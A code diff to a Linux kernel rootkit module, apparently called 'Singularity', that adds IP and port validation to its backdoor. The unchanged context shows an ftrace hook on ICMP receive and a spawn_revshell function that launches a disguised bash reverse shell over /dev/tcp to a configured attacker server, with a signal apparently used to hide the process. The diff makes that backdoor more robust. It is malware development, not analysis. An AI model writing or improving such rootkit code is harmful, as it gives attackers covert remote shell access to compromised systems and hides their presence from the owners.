@@ -9,6 +9,42 @@
 
 static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
 
+static char validated_ip[16] = {0};
+static char validated_port[6] = {0};
+
+static notrace bool validate_ip_port(const char *ip, const char *port)
+{
+    u32 ip_addr;
+    long port_num;
+    int i;
+    const char *dangerous_chars = ";|&`$(){}[]<>'\"\\";
+    
+    if (!ip || !port)
+        return false;
+    
+    for (i = 0; dangerous_chars[i]; i++) {
+        if (strchr(ip, dangerous_chars[i]) || strchr(port, dangerous_chars[i]))
+            return false;
+    }
+    
+    if (!in4_pton(ip, -1, (u8 *)&ip_addr, -1, NULL))
+        return false;
+    
+    if (kstrtol(port, 10, &port_num) != 0)
+        return false;
+    
+    if (port_num < 1 || port_num > 65535)
+        return false;
+    
+    strncpy(validated_ip, ip, sizeof(validated_ip) - 1);
+    validated_ip[sizeof(validated_ip) - 1] = '\0';
+    
+    strncpy(validated_port, port, sizeof(validated_port) - 1);
+    validated_port[sizeof(validated_port) - 1] = '\0';
+    
+    return true;
+}
+
 struct revshell_work {
     struct work_struct work;
 };
@@ -28,13 +64,20 @@ notrace static void spawn_revshell(struct work_struct *work)
     struct task_struct *task;
     pid_t baseline_pid = 0;
 
+    if (!validated_ip[0] || !validated_port[0]) {
+        if (!validate_ip_port(YOUR_SRV_IP, SRV_PORT)) {
+            kfree(container_of(work, struct revshell_work, work));
+            return;
+        }
+    }
+    
     snprintf(cmd, sizeof(cmd),
              "bash -c '"
              "PID=$$; "
              "kill -59 $PID; "
              "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
              "' &",
-             PROC_NAME, YOUR_SRV_IP, SRV_PORT);
+             PROC_NAME, validated_ip, validated_port);
 
     argv[3] = cmd;
 
@@ -110,6 +153,11 @@ static struct ftrace_hook hooks[] = {
 
 notrace int hiding_icmp_init(void)
 {
+    if (!validate_ip_port(YOUR_SRV_IP, SRV_PORT)) {
+        printk(KERN_ERR "Singularity: Invalid IP/PORT configuration\n");
+        return -EINVAL;
+    }
+    
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
